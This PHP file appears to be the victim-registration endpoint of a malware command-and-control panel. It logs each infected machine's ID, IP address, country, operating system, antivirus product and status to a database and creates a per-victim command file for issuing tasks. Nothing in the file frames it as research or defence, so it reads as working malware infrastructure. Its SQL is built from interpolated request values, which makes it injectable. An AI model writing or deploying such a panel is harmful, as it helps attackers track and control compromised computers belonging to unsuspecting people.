<?php
include 'config.php';
$VictimID =  CheckData($_GET['VicID']);
$ipadress =  $_SERVER['REMOTE_ADDR'];
$contery = strtolower(GetConteryCode($ipadress));
$os =  CheckData($_GET['os']);
$antivirus =  CheckData($_GET['antivirus']);
$status =  CheckData($_GET['status']);

if (file_exists("Clients/".$VictimID.".txt") == False) {
    $connectionquiry = "INSERT INTO Clients (VicID,IPAdress,Contery,OS,AntiVirus,Status) VALUES ('$VictimID','$ipadress','$contery','$os','$antivirus','$status')";
    $newconnection = mysqli_query($conn,$connectionquiry);
    $commandfile = fopen("Clients/".$VictimID.".txt", "w");
    fwrite($commandfile, "");
    fclose($commandfile);

} else {
  
    if (file_exists("Clients/".$VictimID.".txt")) {
        if (CheckClient($conn,$VictimID) == True) {
 $sql = "UPDATE `Clients` SET 
       `VicID` = '$VictimID', 
       `IPAdress` = '$ipadress',
       `Contery` = '$contery',
       `OS` = '$os',
       `AntiVirus` = '$antivirus',
       `Status` = '$status' 
       WHERE VicID='$VictimID'";
            $UpdateClient = mysqli_query($conn,$sql);
        } else {
         $connectionquiry = "INSERT INTO Clients (VicID,IPAdress,Contery,OS,AntiVirus,Status) VALUES ('$VictimID','$ipadress','$contery','$os','$antivirus','$status')";
         $newconnection = mysqli_query($conn,$connectionquiry);   
        }
    }
}
    

function GetConteryCode($IPaddress) {
   $json = file_get_contents('http://www.geoplugin.net/json.gp?ip='.$IPaddress); 
   $data = json_decode($json);
   return $data->geoplugin_countryCode;
}

function CheckClient($SQLConnection,$ClientID){
$result = mysqli_query($SQLConnection,"SELECT * FROM Clients WHERE VicID='".$ClientID."'");
if(mysqli_num_rows($result) > 0){
    return True;
}else{
    return False;
}
}

function CheckData($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    $dat = strip_tags($data);
    return $data;
  }
?>